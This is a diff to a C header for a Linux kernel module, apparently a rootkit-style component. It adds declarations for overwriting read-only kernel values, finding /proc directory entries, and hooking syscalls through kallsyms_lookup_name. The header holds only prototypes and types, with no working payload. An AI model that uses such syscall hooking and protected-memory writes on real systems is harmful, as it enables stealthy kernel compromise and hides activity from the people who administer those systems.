@@ -5,6 +5,7 @@
 #include "macro_utils.h"
 #include <asm/ptrace.h>
 #include <linux/init.h>
+#include <linux/proc_fs.h>
 #include <linux/syscalls.h>
 #include <linux/types.h>
 
@@ -90,6 +91,11 @@
 typedef void *(*kallsyms_t)(const char *s_name);        // The type of `kallsyms_lookup_name()`.
 typedef long (*sysfun_t)(struct pt_regs *const p_regs); // The type of a syscall function.
 
+typedef struct proc_dir_entry proc_dir_entry_t; // The type of a /proc entry.
+typedef proc_dir_entry_t *(*pde_subdir_find_t)(proc_dir_entry_t *dir,
+                                               const char *name,
+                                               unsigned int len);
+
 /**
  * Structure representing a syscall hook.
  */
@@ -110,6 +116,14 @@ typedef struct signal_handler_tag {
 } signal_handler_t;
 
 extern kallsyms_t lookup_name; // Function pointer for `kallsyms_lookup_name()`.
+
+/**
+ * Changes a read-only value.
+ *
+ * @param p_addr    The address of the value to change
+ * @param p_new_val The new value
+ */
+void change_protected_value(void *const p_addr, void *const p_new_val);
 
 /**
  * Initializes the hooking module.
@@ -165,5 +179,13 @@ int hook_syscalls(hook_t p_hooks[]) __init;
  * @param p_hooks The array of hooks to be uninstalled (the last element must have a NULL `new_sysfun`)
  */
 void unhook_syscalls(const hook_t p_hooks[]) __exit;
+
+/**
+ * Gets the /proc dir entry for the given name.
+ *
+ * @param s_name The name of the /proc entry
+ * @return The /proc dir entry
+ */
+proc_dir_entry_t *get_proc_entry(const char *const s_name);
 
 #endif
